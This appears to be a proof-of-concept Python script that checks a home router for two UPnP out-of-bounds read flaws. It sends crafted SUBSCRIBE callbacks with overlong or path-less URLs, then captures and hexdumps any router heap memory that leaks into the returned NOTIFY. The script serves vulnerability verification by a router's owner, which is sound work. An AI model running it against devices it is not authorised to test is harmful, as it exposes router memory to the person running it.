#!/usr/bin/env python3
"""
OOB-03 / OOB-04 real-router test (UPnP event NOTIFY). Python 3, standard library only.

HOW IT WORKS
  1. Starts a small TCP listener on this PC.
  2. Sends the router a normal UPnP SUBSCRIBE (/evt/IPConn) whose CALLBACK points back at THIS PC.
  3. The router connects to the listener and sends an event NOTIFY. The script records it.
  The router only accepts a callback whose host is the requester's own IP, so this tests your own PC only.

CASES
  A (OOB-03): callback has a long path.   Safe router: NOTIFY <= 1023 bytes.
              Affected: NOTIFY longer than 1024 bytes, tail is not text.
  B (OOB-04): callback has NO '/' after the port.   Safe router: request line is "NOTIFY / HTTP/1.1"
              (or similar clean path). Affected: the path in the request line is garbage bytes taken
              from the router's memory.

NOTE: the NOTIFY tail can contain router heap memory (addresses). Keep it private.
It creates a subscription that expires by itself (TIMEOUT 60s) and is removed with UNSUBSCRIBE.

RUN (PC on the router's real LAN; Windows PowerShell is fine; not WSL2-NAT):
  python evt01_real_router_test.py                  (router 192.168.0.1, PC IP auto-detected)
  python evt01_real_router_test.py 192.168.0.1 192.168.0.8
Windows may ask to allow Python through the firewall for incoming connections: allow it on Private networks.
"""
import re
import socket
import sys
import threading
import time

ROUTER = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
LPORT = 18080


def my_ip():
    if len(sys.argv) > 2:
        return sys.argv[2]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ROUTER, 9))
    ip = s.getsockname()[0]
    s.close()
    return ip


def discover():
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: %s:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\n"
           "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n" % ROUTER).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(msg, (ROUTER, 1900))
    try:
        data, _ = s.recvfrom(4096)
    except socket.timeout:
        return None
    m = re.search(r"LOCATION:\s*http://([\d.]+):(\d+)/", data.decode("latin-1"), re.I)
    return int(m.group(2)) if m else None


class Listener(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("0.0.0.0", LPORT))
        self.srv.listen(1)
        self.srv.settimeout(12)
        self.data = b""

    def run(self):
        try:
            c, _ = self.srv.accept()
        except socket.timeout:
            return
        c.settimeout(3)
        try:
            while True:
                d = c.recv(65536)
                if not d:
                    break
                self.data += d
        except socket.timeout:
            pass
        try:
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
        except OSError:
            pass
        c.close()


def subscribe(port, callback):
    req = ("SUBSCRIBE /evt/IPConn HTTP/1.1\r\nHOST: %s:%d\r\nCALLBACK: <%s>\r\nNT: upnp:event\r\n"
           "TIMEOUT: Second-60\r\n\r\n" % (ROUTER, port, callback)).encode()
    s = socket.create_connection((ROUTER, port), timeout=5)
    s.sendall(req)
    resp = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            resp += d
    except socket.timeout:
        pass
    s.close()
    return resp.decode("latin-1")


def unsubscribe(port, sid):
    if not sid:
        return
    req = ("UNSUBSCRIBE /evt/IPConn HTTP/1.1\r\nHOST: %s:%d\r\nSID: %s\r\n\r\n" % (ROUTER, port, sid)).encode()
    try:
        s = socket.create_connection((ROUTER, port), timeout=3)
        s.sendall(req)
        s.close()
    except OSError:
        pass


def run_case(port, ip, label, callback):
    lst = Listener()
    lst.start()
    time.sleep(0.3)
    resp = subscribe(port, callback)
    first = resp.splitlines()[0] if resp else "(no reply)"
    m = re.search(r"SID:\s*(\S+)", resp, re.I)
    lst.join(timeout=14)
    unsubscribe(port, m.group(1) if m else None)
    return first, lst.data


def printable(b):
    return "".join(chr(c) if 32 <= c < 127 else "." for c in b)


def main():
    port = discover()
    if not port:
        print("No UPnP router answered SSDP from this PC. Check LAN / UPnP setting / not WSL2-NAT.")
        sys.exit(1)
    ip = my_ip()
    print(f"Router {ROUTER}  UPnP port {port}  this PC {ip}  listener port {LPORT}\n")

    print("=== Case A (OOB-03): long callback path ===")
    print(f"{'path len':>8} {'subscribe reply':<28} {'NOTIFY bytes':>12}  verdict")
    over = []
    for n in (0, 200, 400, 800, 1200):
        cb = f"http://{ip}:{LPORT}/" + "P" * n
        first, data = run_case(port, ip, f"A{n}", cb)
        verdict = "no NOTIFY received" if not data else "normal (<= 1023)"
        if len(data) > 1024:
            verdict = f"*** {len(data) - 1024} bytes beyond the 1024-byte buffer ***"
            over.append((n, data))
        print(f"{n:>8} {first[:28]:<28} {len(data):>12}  {verdict}")

    print("\n=== Case B (OOB-04): callback with no '/' after the port ===")
    first, data = run_case(port, ip, "B", f"http://{ip}:{LPORT}")
    line = data.split(b"\r\n", 1)[0] if data else b""
    print("subscribe reply:", first)
    print("NOTIFY request line (bytes):", line[:120])
    clean = bool(re.fullmatch(rb"NOTIFY /[ -~]{0,40} HTTP/1\.1", line)) and len(line) < 40
    # empty path ("NOTIFY  HTTP/1.1") is printable ASCII only: nothing leaked
    empty_path = bool(re.fullmatch(rb"NOTIFY +HTTP/1\.1", line))
    if not data:
        print("verdict: no NOTIFY received (firewall on this PC? UPnP events off?)")
    elif clean:
        print("verdict: request line is clean (normal)")
    elif empty_path:
        print("verdict: request line has an empty path, no foreign bytes -> OOB-04 NOT demonstrated")
    else:
        print("verdict: *** request line contains unexpected bytes (read beyond the callback string) ***")

    print()
    if over:
        n, data = over[-1]
        print(f"=== OOB-03 reproduced: path {n}: NOTIFY {len(data)} bytes, {len(data) - 1024} past offset 1024 ===")
        tail = data[1024:1024 + 96]
        for off in range(0, len(tail), 16):
            c = tail[off:off + 16]
            print(f"  +{1024 + off:4d}  {c.hex(' '):<47}  {printable(c)}")
        print("Keep this output private (router memory).")
    else:
        print("=== OOB-03: no NOTIFY longer than 1024 bytes on this router ===")


if __name__ == "__main__":
    main()
